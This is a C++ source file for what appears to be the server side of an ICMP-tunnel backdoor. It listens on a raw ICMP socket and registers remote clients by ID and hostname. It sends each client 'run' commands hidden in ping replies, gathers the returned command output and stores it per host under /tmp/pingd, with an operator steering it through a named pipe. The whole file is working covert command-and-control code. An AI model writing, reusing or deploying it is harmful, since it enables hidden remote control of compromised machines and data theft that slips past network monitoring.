#include <cstdint>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <sstream>
#include <fstream>
#include <map>
#include <vector>
#include <thread>
#include <mutex>
#include <algorithm>

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

struct buffer
{
  size_t pos{ 0 };
  bool ready{ false };
  std::vector<uint8_t> data;
};

struct connection
{
  connection(const std::string &ip)
    : ip{ ip },
      flush{ 0x00 }
  {
  }
  std::string ip;
  std::string hostname;
  buffer out_buf;
  buffer in_buf;
  uint8_t flush;
};

using connections_t = std::map<uint32_t, connection>;

static uint32_t next_connection_id = 1000;

static connections_t active_connections;
static std::mutex active_connections_mutex;

static int pipefd, sockfd;

static bool running = false;

static uint16_t checksum(uint16_t *ptr, int nbytes)
{
  uint64_t sum;
  uint16_t oddbyte, rs;

  sum = 0;
  while (nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }

  if (nbytes == 1) {
    oddbyte = 0;
    *((uint8_t *)&oddbyte) = *(uint8_t *)ptr;
    sum += oddbyte;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  rs = ~sum;
  return rs;
}

void termination_handler(int)
{
  std::puts("Killing process!");
  running = false;
  close(sockfd);
  close(pipefd);
  std::exit(0);
}

void listen_task()
{
  uint8_t in[1024];
  sockaddr_in addr;

  if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
    perror("socket");
    std::exit(-1);
  }

  while (running) {
    std::memset(in, 0, sizeof(in));

    size_t nbytes = read(sockfd, in, sizeof(in));
    if (nbytes < sizeof(iphdr)) continue;
    nbytes -= sizeof(iphdr);

    if (nbytes < sizeof(icmphdr)) continue;
    nbytes -= sizeof(icmphdr);

    iphdr *ip = (iphdr *)in;
    icmphdr *icmp = (icmphdr *)(in + sizeof(iphdr));

    size_t packet_size = sizeof(icmphdr);
    uint32_t id;
    size_t index = sizeof(iphdr) + sizeof(icmphdr);

    if (nbytes == 0) {
      std::lock_guard<std::mutex> guard(active_connections_mutex);
      id = next_connection_id++;
      active_connections.insert({ id, connection{ inet_ntoa(in_addr{ ip->saddr }) } });
      std::memcpy(&in[index], &id, sizeof(id));
      packet_size += sizeof(id);
      std::cout << "New connection with id=" << id << "\n";
    } else {

      if (nbytes < sizeof(id)) continue;
      nbytes -= sizeof(id);

      std::memcpy(&id, &in[index], sizeof(id));

      if (active_connections.find(id) == active_connections.end()) continue;

      auto &connection = active_connections.at(id);
      auto &in_buf = connection.in_buf;
      auto &out_buf = connection.out_buf;

      if (nbytes > 0) {
        std::lock_guard<std::mutex> guard(active_connections_mutex);
        index += sizeof(id);

        if (in[index] == 0x00 && nbytes != 1) {
          in_buf.data.insert(in_buf.data.end(), &in[index + 1], &in[index + nbytes]);
        } else if (in[index] == 0x01) {
          if (nbytes != 1) {
            in_buf.data.insert(in_buf.data.end(), &in[index + 1], &in[index + nbytes]);
          }
          in_buf.ready = true;
        } else if (in[index] == 0x02) {
          connection.hostname = std::string{ (char *)&in[index + 1], nbytes - 1 };
        }
      }

      std::memcpy(&in[sizeof(iphdr) + packet_size], &id, sizeof(id));
      packet_size += sizeof(id);

      std::memcpy(&in[sizeof(iphdr) + packet_size], &connection.flush, sizeof(connection.flush));
      packet_size += sizeof(connection.flush);

      if (connection.flush == 0x01) {
        connection.flush = 0x00;
      }

      if (out_buf.ready && out_buf.pos < out_buf.data.size()) {
        std::lock_guard<std::mutex> guard(active_connections_mutex);
        size_t to_write = (out_buf.data.size() - out_buf.pos) > 64 ? 64 : (out_buf.data.size() - out_buf.pos);
        std::memcpy(&in[sizeof(iphdr) + packet_size], out_buf.data.data() + out_buf.pos, to_write);
        out_buf.pos += to_write;
        packet_size += to_write;
        if (out_buf.pos >= out_buf.data.size()) {
          std::cout << "Flushing data for id=" << id << "\n";
          out_buf.data.clear();
          out_buf.pos = 0;
          out_buf.ready = false;
          connection.flush = 0x01;
        }
      }
    }

    icmp->type = 0;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(0);
    addr.sin_addr.s_addr = ip->saddr;

    icmp->checksum = 0x00;
    icmp->checksum = checksum((uint16_t *)icmp, packet_size);

    if (sendto(sockfd, icmp, packet_size, 0, (sockaddr *)&addr, sizeof(addr)) == -1) {
      perror("sendto");
      std::exit(-1);
    }
  }

  close(sockfd);
}

void send_command(const std::string &idstr, const std::string &command)
{
  std::string cmd = "run ";
  cmd.append(command);

  std::stringstream ss(idstr);

  uint32_t id;
  ss >> id;

  if (active_connections.find(id) == active_connections.end()) {
    return;
  }
  auto &connection = active_connections.at(id);

  {
    std::lock_guard<std::mutex> guard(active_connections_mutex);
    connection.out_buf.data.assign(cmd.begin(), cmd.end());
    connection.out_buf.ready = true;
  }

  std::cout << "Sending command:" << command << " to id=" << id << "\n";

  while (!connection.in_buf.ready) {}

  std::cout << "Command executed for id=" << id << "\n";

  {
    std::lock_guard<std::mutex> guard(active_connections_mutex);

    std::string filename = "/tmp/pingd/";
    filename.append(connection.hostname);
    filename.append("(");
    filename.append(idstr);
    filename.append(")");

    if (connection.in_buf.data.size() > 0) {
      std::ofstream outfile(filename, std::ios::out | std::ios::binary | std::ios::app);
      outfile << command << "\n";
      outfile << "----------------------------------------\n";
      outfile.write((char *)connection.in_buf.data.data(), connection.in_buf.data.size());
      outfile << "----------------------------------------\n";
      outfile.close();
    }

    connection.in_buf.ready = false;
    connection.in_buf.data.clear();
  }
}

void refresh()
{
  std::puts("Refreshing connections!");
  std::lock_guard<std::mutex> guard(active_connections_mutex);

  std::ofstream connections("/tmp/pingd/connections");
  if (!connections.is_open()) {
    std::fputs("Couldn't open file!", stderr);
  }

  for (auto it = active_connections.begin();
       it != active_connections.end();
       it++) {

    std::string out{ it->second.hostname };
    out.append("(").append(std::to_string(it->first)).append(")");

    connections << out << "\n";
  }

  connections.close();
}

int main(void)
{
  // make pipe
  umask(0);
  if (mkdir("/tmp/pingd/", 0777) == -1) {
    if (errno != EEXIST) {
      perror("mkdir");
      exit(-1);
    }
  }

  if (mkfifo("/tmp/pingd/pipe", S_IFIFO | 0666) == -1) {
    if (errno != EEXIST) {
      perror("mkfifo");
      exit(-1);
    }
  }

  // set signals
  struct sigaction new_action, old_action;
  new_action.sa_handler = termination_handler;
  sigemptyset(&new_action.sa_mask);
  new_action.sa_flags = 0;

  sigaction(SIGINT, NULL, &old_action);
  if (old_action.sa_handler != SIG_IGN)
    sigaction(SIGINT, &new_action, NULL);
  sigaction(SIGHUP, NULL, &old_action);
  if (old_action.sa_handler != SIG_IGN)
    sigaction(SIGHUP, &new_action, NULL);
  sigaction(SIGTERM, NULL, &old_action);
  if (old_action.sa_handler != SIG_IGN)
    sigaction(SIGTERM, &new_action, NULL);

  // start thread
  running = true;
  std::thread listen_thread{ listen_task };

  if ((pipefd = open("/tmp/pingd/pipe", O_RDONLY)) == -1) {
    perror("open()");
    return -1;
  }

  while (running) {
    uint8_t buf[1024];
    ssize_t nbytes;
    if ((nbytes = read(pipefd, buf, 1024)) == -1) {
      perror("read()");
    }

    if (nbytes == 0) {
      continue;
    }

    std::string in_str{ (char *)buf, static_cast<size_t>(nbytes) };
    in_str.erase(std::remove(in_str.begin(), in_str.end(), '\n'), in_str.end());

    if (in_str == "refresh") {
      refresh();
      continue;
    }

    auto cmd_pos = in_str.find(' ');
    auto id_bg_pos = in_str.find('(');
    auto id_ed_pos = in_str.find(')');

    std::string cmd = in_str.substr(0, cmd_pos);
    std::string id = in_str.substr(id_bg_pos + 1, id_ed_pos - id_bg_pos - 1);
    std::string arg = in_str.substr(id_ed_pos + 2);

    if (cmd == "send_command") {
      send_command(id, arg);
    }
  }

  close(pipefd);

  return 0;
}